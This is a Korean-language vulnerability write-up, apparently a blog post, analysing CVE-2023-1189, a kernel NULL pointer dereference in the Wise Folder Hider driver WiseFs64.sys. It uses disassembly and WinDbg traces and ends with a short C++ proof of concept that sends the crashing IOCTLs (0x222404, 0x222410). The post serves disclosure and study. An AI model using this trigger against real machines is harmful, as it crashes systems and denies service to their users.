---
layout: post
title: "CVE-2023-1189"
author: "le0s1mba"
date: 2026-02-01 23:04:00 +0900
categories: [Windows, Vulnerability]
tags: [CVE, Kernel, IOCTL, DoS]
---

## Summary

본 취약점은 WiseCleaner Wise Folder Hider 5.0.9.239 버전에서 로컬 권한을 가진 공격자가 특정 IOCTL을 통해 커널 NULL pointer dereference를 유도하여 시스템을 BSOD 상태로 만드는 Local Denial of Service 취약점이다.

해당 취약점은 WiseFs64.sys 드라이버의 IRP_MJ_DEVICE_CONTROL 핸들러에서 MasterIrp 포인터에 대한 검증 없이 이를 역참조하는 흐름에서 발생한다.


## Technical Details

![DispatchTable에서 IRP_MJ_DEVICE_CONTROL 항목이 sub_140001650에 할당됨](../assets/img/posts/2026-02-01-CVE-2023-1189/IRP_MJ_DEVICE_CONTROL%20entry.png)

위는 DriverEntry 함수에서 _security_init_cookie 함수 다음으로 호출되는 sub_140001768 함수이다.

sub_140001768 함수에서 설정되는 DispatchTable을 보면 IRP_MJ_DEVICE_CONTROL의 처리를 담당하는 함수로 sub_140001650이 설정되는 것을 확인할 수 있다.

![sub_140001650 함수의 내부 구현현](../assets/img/posts/2026-02-01-CVE-2023-1189/sub-140001650%20function.png)

sub_140001650 함수는 Device Object가 Control Device인지 확인하여 맞으면 sub_1400012EC 함수를 호출한다.

![WinDbg에서 본 sub_140001650 내부 구현](../assets/img/posts/2026-02-01-CVE-2023-1189/sub_140001650%20windbg.png)

WinDbg로 해당 동작을 확인해 보면 Device Object가 Control Device인지 확인하는 부분은 0xfffff8063e921654 부분이다.

![sub_140001650 함수의 메모리 뷰](../assets/img/posts/2026-02-01-CVE-2023-1189/sub_140001650%20memory.png)

0xfffff8063e921654 위치를 기준으로 메모리를 확인해 보면, 0xFFFFF8063E927370 주소에 저장된 값과 rcx 레지스터 값이 동일한 것을 확인할 수 있다.

![IRP를 처리하는 sub_1400012EC의 취약 구간](../assets/img/posts/2026-02-01-CVE-2023-1189/vulnerable%20positions.png)

sub_1400012EC 함수는 IOCTL에 맞춰 IRP들을 처리해주는 함수이다.

여기서 0x222404와 0x222410 IOCTL 코드는 MasterIrp→Type에 대한 검증 없이 접근하고 있는 것을 확인할 수 있다.

![sub_1400012EC의 0x222404 처리](../assets/img/posts/2026-02-01-CVE-2023-1189/0x222404%20IOCTL%20windbg.png)

먼저 0x222404 IOCTL을 WinDbg로 보면 0xFFFFF8063E927388에 rcx의 값을 넣어주고 있다.

![0x222404 IOCTL 레지스터 상태](../assets/img/posts/2026-02-01-CVE-2023-1189/0x222404%20IOCTL%20register.png)

하지만 레지스터를 보면 rcx의 값이 0으로 설정되어 있는 것을 확인할 수 있다.

![Error Code: 0xC0000005(Access Violation)](../assets/img/posts/2026-02-01-CVE-2023-1189/0xC0000005(Access%20Violation)%20-%200x222404.png)

때문에 0xfffff8063e9213f2에서 rcx에 접근하게 되면 NULL pointer dereference가 발생하여 0xC0000005 에러 코드가 터지는 것을 확인할 수 있다.

![sub_1400012EC의 0x222410 처리](../assets/img/posts/2026-02-01-CVE-2023-1189/0x222410%20IOCTL%20windbg.png)

0x222410 IOCTL은 0xFFFFF8066E1E3BB4 함수의 첫 번째 인자로 rcx의 값을 넣어준다.

![0x222410 IOCTL 레지스터 상태](../assets/img/posts/2026-02-01-CVE-2023-1189/0x222410%20IOCTL%20register.png)

이때 rcx가 0이면 인자로 넣어주는 부분에서 NULL pointer dereference가 발생하게 된다.

![Error Code: 0xC0000005(Access Violation)](../assets/img/posts/2026-02-01-CVE-2023-1189/0xC0000005(Access%20Violation)%20-%200x222410.png)


## PoC

```C++
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\WiseFS"

HANDLE hDevice;

int main(int argc, char* argv[]) {
	DWORD dwWrite = 0;

	hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, 3, 4, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("failed to CreateFile\n");
		return 1;
	}

	// case 0x222404
	// DeviceIoControl(hDevice, 0x222404, NULL, 0, NULL, 0, &dwWrite, NULL);

	// case 0x222410
	// DeviceIoControl(hDevice, 0x222410, NULL, 0, NULL, 0, &dwWrite, NULL);
	
	return 0;
}```